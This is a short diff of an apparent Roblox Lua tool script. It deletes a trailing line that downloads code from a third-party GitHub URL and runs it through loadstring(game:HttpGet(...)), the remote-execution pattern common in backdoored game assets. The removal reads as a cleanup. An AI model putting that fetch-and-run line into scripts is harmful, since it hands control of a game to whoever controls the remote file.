@@ -1923,5 +1923,3 @@ tool.Unequipped:Connect(function()
     end
     print("Hello World")
 end)
-
-loadstring(game:HttpGet("https://github.com/lol9182828/Dances-lol/raw/refs/heads/main/Dances%202"))()
